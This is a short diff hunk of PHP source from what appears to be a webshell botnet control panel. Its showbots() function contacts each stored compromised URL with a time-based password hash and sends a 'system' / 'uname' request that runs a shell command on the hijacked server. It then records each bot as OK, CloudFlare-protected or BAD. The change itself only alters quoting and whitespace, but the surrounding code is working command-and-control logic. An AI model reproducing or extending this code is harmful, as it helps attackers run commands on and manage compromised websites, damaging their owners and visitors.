@@ -144,10 +144,11 @@ function showbots() {
 	while($row = mysqli_fetch_assoc($data)) {
     
 		$source = conn($row['url'] . '?PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&PSW=' . md5(WEBSHELL_PASS . date("h:d")) . '&_=system&__=uname');
+		
 		if(strpos($source, md5(WEBSHELL_PASS . date("h:d")))) {
 			$status = 'OK';
-		} elseif (strpos($source, "CloudFlare")) {
-			$status = "CloudFlare Protection";
+		} elseif (strpos($source, 'CloudFlare')) {
+			$status = 'CloudFlare Protection';
 		} else
 			$status = 'BAD';
 		}
